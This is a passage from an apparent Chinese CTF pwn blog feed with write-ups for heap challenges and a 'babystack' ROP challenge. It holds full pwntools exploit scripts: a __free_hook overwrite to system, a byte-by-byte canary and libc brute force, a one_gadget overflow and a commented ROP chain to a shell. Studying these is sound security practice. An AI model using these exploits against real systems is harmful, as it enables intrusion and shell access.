class="line"></span><br><span class="line"><span class="comment"># chunk overlap again</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"BBBB"</span>, <span class="string">"B"</span> * <span class="number">0x48</span> + p64(<span class="number">0x71</span>) + <span class="string">"B"</span> * <span class="number">0x68</span> + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">add(<span class="number">0x98</span>, <span class="string">"BBBB"</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">"CCCC"</span>, <span class="string">"\x00"</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__free_hook - <span class="number">0x43</span>)) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"DDDD"</span>, <span class="string">"\x00"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xA1</span>) + p64(main_arena) + p64(__free_hook - <span class="number">0x50</span>)) <span class="comment"># chunk 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger unsorted bin attack</span></span><br><span class="line">add(<span class="number">0x98</span>, <span class="string">"EEEE"</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"FFFF"</span>, <span class="string">"\x00"</span> * <span class="number">0x33</span> + p64(libc_system)) <span class="comment"># chunk 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"GGGG"</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="write-IO-FILE-vtable"><a href="#write-IO-FILE-vtable" class="headerlink" title="write _IO_FILE vtable"></a>write _IO_FILE vtable</h2><p>这个还没有接触到过，也没有自己实现过，待补充。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>之前确实有碰到过<code>__malloc_hook</code>改onegadget一次打不通的情况，但是都是通过<code>realloc</code>调整实现的（还以为通用了，结果打脸了），这次好几道题都没办法用这种办法实现，所以学习了一波。</li><li>确实没有遇到过改top chunk的利用方法，这次算是学到了。</li><li><code>__free_hook</code>还是比<code>__malloc_hook</code>稳，onegadget的约束有的时候真的是太难满足了。</li><li>发现两道利用<code>malloc_printerr</code>触发<code>__malloc_hook</code>的从而onegadget来getshell的题目，都是用的<code>[rsp+0x50]==NULL</code>这个约束，是小概率还是大概率还是必然？</li></ul><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ol><li><a href="https://bbs.pediy.com/thread-225973.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225973.htm</a></li><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/</a></li><li><a href="https://www.anquanke.com/post/id/171283#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171283#h2-0</a></li><li><a href="https://bbs.pediy.com/thread-230028.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-230028.htm</a></li><li><a href="https://elixir.bootlin.com/glibc/glibc-2.23/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.23/source</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这几天刷了四道题，巧了都是Fastbin attack，本来惯用的套路是直接onegadget打&lt;code&gt;__malloc_hook&lt;/code&gt;，然后所有onegadget都打不通的情况也很常见，我之前所知道的仅仅局限于&lt;code&gt;__realloc_hook&lt;/code&gt;和&lt;code&gt;__malloc_hook&lt;/code&gt;的联合使用来调整堆栈，但是也有一定的局限性，这次结合pwnable.tw上的几道题以及CTFhub上收录的CISCN 2019的一道题，小小地总结一下Fastbin attack的一些套路。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
      <category term="Summary" scheme="https://n0nop.github.io/categories/Writeup/Summary/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn rop: babystack</title>
    <link href="https://n0nop.github.io/2020/04/09/pwn-rop-babystack/"/>
    <id>https://n0nop.github.io/2020/04/09/pwn-rop-babystack/</id>
    <published>2020-04-09T12:32:17.000Z</published>
    <updated>2020-04-09T12:58:15.140Z</updated>
    
    <content type="html"><![CDATA[<p>其实挺简单的一个rop题目，本来不想写这个wp，感觉没必要，因为除了爆破就是爆破，还爆了十多分钟。但是因为不想直接one_gadget还想了有一段时间怎么写rop，最后还是写出来了，成功打通，索性记录一下。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64程序，保护全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>就两个功能，一个<code>login</code>，要求输入password比较通过后才能开启<code>copy</code>功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">login</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your passowrd :"</span>);</span><br><span class="line">    get_input((<span class="keyword">unsigned</span> __int8 *)&amp;s, <span class="number">0x7F</span>u);</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br><span class="line">    login_state = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login Success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>copy</code>功能，顾名思义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">copy</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> src; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Copy :"</span>);</span><br><span class="line">    get_input((<span class="keyword">unsigned</span> __int8 *)&amp;src, <span class="number">0x3F</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>(a1, &amp;src);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"It is magic copy !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应<code>main</code>函数中的变量来看，这个<code>copy</code>其实就是往<code>v6</code>进行copy：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *v3; <span class="comment">// rcx</span></span><br><span class="line">__int64 v4; <span class="comment">// rdx</span></span><br><span class="line"><span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">__int64 buf; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">__int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">char</span> v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br></pre></td></tr></table></figure><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li><code>login</code>的局部变量<code>s</code>和<code>copy</code>的局部变量<code>v6</code>共享栈空间，但是<code>s</code>可以写入0x7F字节，因此<code>strcpy(a1, &amp;src);</code>这里就可以造成<code>copy</code>的参数<code>a1</code>其实也就是<code>main</code>里面的局部变量<code>v6</code>的溢出。</li><li>再者由于它<code>login</code>的比较逻辑如下，显然这个<code>v1</code>是很容易控制的，那么就可以用来逐字节爆破栈上的东西，这样libc，PIE，以及0x10字节的canary都可以有。因为这里我是想不用one_gadget，那么就必须要得到PIE来写gadgets控rdi（<del>其实就是比one_gadget复杂，但我就是想试试rop</del>）。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br></pre></td></tr></table></figure></li><li>写rop的时候还有坑点，就是这里的溢出是通过<code>strcpy</code>来完成的，它遇到”\x00”就会停止，但是因为从来就没有从<code>main</code>返回过，所以可以分几步写，而且注意必须从高地址往低地址逐个写，不然低地址的gadgets就会被高地址写的时候给覆盖了。另外因为gadgets以及str_bin_sh的地址高两字节都是”\x00”，所以这里还要逐个地把高字节清零（写高地址gadgets的时候残留的）。这样说可能理解起来比较困难，可以自己调试一下就能发现问题了。</li><li>rop写完，直接返回，shell到手。（亲测有效，但是时间有点长）</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>这里exp是我尝试one_gadget的，本地成功了，rop的部分被我注释掉了，远程打通过了。把注释标有one_gadget的部分注释掉，标有rop的取消掉就能跑rop的攻击方法了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(state, password=<span class="string">""</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">if</span> state == <span class="number">1</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Your passowrd :"</span>, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Copy :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span><span class="params">(init, nbytes, half_bytes=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> init != <span class="string">""</span> <span class="keyword">and</span> half_bytes == <span class="literal">True</span>:</span><br><span class="line">        addr = init[:<span class="number">-1</span>]</span><br><span class="line">        half_bytes = ord(init[<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        addr = init</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nbytes):</span><br><span class="line">        print(len(addr))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">and</span> half_bytes == <span class="literal">True</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x10</span>):</span><br><span class="line">                payload = addr + chr((j &lt;&lt; <span class="number">4</span>) | half_bytes) + <span class="string">"\x00"</span></span><br><span class="line">                login(<span class="number">1</span>, payload)</span><br><span class="line">                <span class="keyword">if</span> p.recv(<span class="number">8</span>) != <span class="string">"Failed !"</span>:</span><br><span class="line">                    addr += chr((j &lt;&lt; <span class="number">4</span>) | half_bytes)</span><br><span class="line">                    login(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">                payload = addr + chr(j) + <span class="string">"\x00"</span></span><br><span class="line">                login(<span class="number">1</span>, payload)</span><br><span class="line">                <span class="keyword">if</span> p.recv(<span class="number">8</span>) != <span class="string">"Failed !"</span>:</span><br><span class="line">                    addr += chr(j)</span><br><span class="line">                    login(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">main = <span class="number">0xecf</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000000010c3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000000010c1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">one_gadget_offset = <span class="number">0xf0567</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force the canary</span></span><br><span class="line">canary = bruteforce(<span class="string">""</span>, <span class="number">0x10</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force done</span></span><br><span class="line">success(<span class="string">"Canary leak done!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # if write rop chain, then will need the PIE</span></span><br><span class="line"><span class="comment"># # again brute force the PIE</span></span><br><span class="line"><span class="comment"># login(1, "\x00".ljust(0x40, "A"))</span></span><br><span class="line"><span class="comment"># copy("BBBB")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"><span class="comment"># PIE_related = u64(bruteforce("\x70\x0b", 6).ljust(8, "\x00"))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # brute force done</span></span><br><span class="line"><span class="comment"># PIE = PIE_related - 0xb70</span></span><br><span class="line"><span class="comment"># PIE_main = PIE + main</span></span><br><span class="line"><span class="comment"># PIE_pop_rsi_r15 = PIE + pop_rsi_r15</span></span><br><span class="line"><span class="comment"># PIE_pop_rdi = PIE + pop_rdi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># finally brute force the libc</span></span><br><span class="line">login(<span class="number">1</span>, <span class="string">"\x00"</span>.ljust(<span class="number">0x48</span>, <span class="string">"A"</span>))</span><br><span class="line">copy(<span class="string">"BBBB"</span>)</span><br><span class="line">login(<span class="number">0</span>)</span><br><span class="line">libc_related = u64(bruteforce(<span class="string">"A"</span> * <span class="number">8</span> + <span class="string">"\x39\x04"</span>, <span class="number">6</span>)[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># brute force done</span></span><br><span class="line">libc_base = libc_related - <span class="number">0x78439</span></span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gagdet</span></span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">payload = <span class="string">"\x00"</span>.ljust(<span class="number">0x40</span>, <span class="string">"C"</span>)</span><br><span class="line">payload += canary</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">"C"</span>)</span><br><span class="line">payload += flat([<span class="number">0xdeadbeefbeefdead</span>, one_gadget])</span><br><span class="line">login(<span class="number">1</span>, payload)</span><br><span class="line">copy(<span class="string">"D"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # write rop ==&gt; system("/bin/sh")</span></span><br><span class="line"><span class="comment"># # write libc_system first</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x78, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([libc_system]))[:-1]</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # then write bin_sh address</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x70, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([str_bin_sh]))[:-2] + "C\x00"</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x70, "C")</span></span><br><span class="line"><span class="comment"># payload += flat(([str_bin_sh]))</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # then write pop_rdi gadget</span></span><br><span class="line"><span class="comment"># # keep the canary</span></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x60, "C")</span></span><br><span class="line"><span class="comment"># payload += flat([0xdeadbeefbeefdead, PIE_pop_rdi])[:-2] + "C\x00"</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"><span class="comment"># login(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "\x00".ljust(0x40, "C")</span></span><br><span class="line"><span class="comment"># payload += canary</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x60, "C")</span></span><br><span class="line"><span class="comment"># payload += flat([0xdeadbeefbeefdead, PIE_pop_rdi])</span></span><br><span class="line"><span class="comment"># login(1, payload)</span></span><br><span class="line"><span class="comment"># copy("D")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># success("PIE_related: " + hex(PIE_related))</span></span><br><span class="line"><span class="comment"># success("PIE: " + hex(PIE))</span></span><br><span class="line">success(<span class="string">"libc_related: "</span> + hex(libc_related))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>没啥好小结的，就是普通的rop，只不过爆破时间挺长。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实挺简单的一个rop题目，本来不想写这个wp，感觉没必要，因为除了爆破就是爆破，还爆了十多分钟。但是因为不想直接one_gadget还想了有一段时间怎么写rop，最后还是写出来了，成功打通，索性记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn heap: BookWriter</title>
    <link href="https://n0nop.github.io/2020/04/09/pwn-heap-BookWriter/"/>
    <id>https://n0nop.github.io/2020/04/09/pwn-heap-BookWriter/</id>
    <published>2020-04-09T01:52:44.000Z</published>
    <updated>2020-12-03T03:39:37.397Z</updated>
    
    <content type="html"><![CDATA[<p>典型的House of orange + unsorted bin attack + _IO_FILE，之前在<a href="https://n0nop.com/2020/02/07/pwn-heap-melody-center/" target="_blank" rel="noopener">melody_center</a>中有写过，基本是一样的，除了一些利用的细节。权当是练习了，毕竟第一次接触的时候，写起来有点吃力。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64程序，保护除了<code>PIE</code>全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>题目提供了五个功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">      BookWriter      </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add a page        </span><br><span class="line"> 2. View a page       </span><br><span class="line"> 3. Edit a page       </span><br><span class="line"> 4. Information       </span><br><span class="line"> 5. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure><p>最开始的时候会要求输入author name。<br><br><code>add</code>功能就是添加一个page，地址和大小分别存在bss上两个数组里面。<br><br><code>view</code>功能就是输出一个给定page的内容。<br><br><code>edit</code>功能就是修改一个给定page的内容，但是这里会重新根据<code>strlen(content)</code>来修改之前提到的bss上存大小的数组里，从而影响下一次可以读入的字节数。<br><br><code>info</code>功能就是输出author name, page数量，以及提供更改author name的选择。</p><h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h2><p>House of orange攻击的核心，就是在没有free函数的情况下，释放出一个unsorted bin供利用，而主要的原理就是利用top chunk。<br><br>一般在可以overwrite top chunk size的情况下，请求malloc一个比伪造的top chunk size更大的空间时。在<code>_int_malloc</code>检验fastbin, smallbin, unsorted bin, large bin没有找到符合需求的块时，接下俩<code>_int_malloc</code>会试图从top chunk切，如果top chunk的空间也不够，那么会执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>ptmalloc</code>已经不能满足用户申请堆内存的操作，需要执行<code>sysmalloc</code>来向系统申请更多的空间。但是对于堆来说有<code>mmap</code>和<code>brk</code>两种分配方式，我们需要让堆以<code>brk</code>的形式拓展，之后原有的top chunk会被置于unsorted bin中。<br><br>综上，我们要实现<code>brk</code>拓展top chunk，但是要实现这个目的需要绕过一些libc中的check。首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>如果所需分配的chunk大小大于<code>mmap</code>分配阈值，默认为<code>128K</code>，并且当前进程使用<code>mmap()</code>分配的内存块小于设定的最大值，将使用<code>mmap()</code>系统调用直接向操作系统申请内存。<br><br>此外，在<code>sysmalloc</code>函数中存在对top chunk size的check，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) </span><br><span class="line">        || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE </span><br><span class="line">        &amp;&amp; prev_inuse(old_top) </span><br><span class="line">        &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这里检查了top chunk的合法性：</p><ul><li>如果第一次调用本函数，top 